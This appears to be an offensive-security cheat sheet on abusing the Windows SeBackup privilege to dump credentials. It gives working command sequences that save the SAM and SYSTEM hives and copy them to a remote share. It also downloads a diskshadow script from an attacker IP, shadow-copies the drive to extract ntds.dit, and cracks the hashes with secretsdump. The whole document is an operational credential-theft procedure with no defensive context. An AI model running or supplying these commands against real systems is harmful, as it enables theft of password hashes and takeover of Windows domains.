---
title: SeBackup / SeRestore - SAM/NTDS Dump
category: privesc
subcategory: windows-tokens
os: windows
command: reg save hklm\sam c:\Temp\sam
tools: reg, diskshadow, robocopy, impacket-secretsdump
---


### Quick local SAM/SYSTEM dump (when SeBackup is held)

```cmd
cd c:\
mkdir temp
cd temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
copy sam,system \\TSCLIENT\share\
```

```bash
impacket-secretsdump -sam sam -system system local
```

### diskshadow + robocopy for NTDS.dit

Create `viper.dsh`:

```
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```

```bash
unix2dos viper.dsh
```

On the target:

```powershell
iwr -uri http://10.13.31.108/viper.dsh -o viper.dsh
diskshadow /s viper.dsh
robocopy /b x:\windows\ntds . ntds.dit
reg save hklm\system c:\windows\temp\system
```

Then on Kali:

```bash
secretsdump.py -ntds ntds.dit -system system local
```
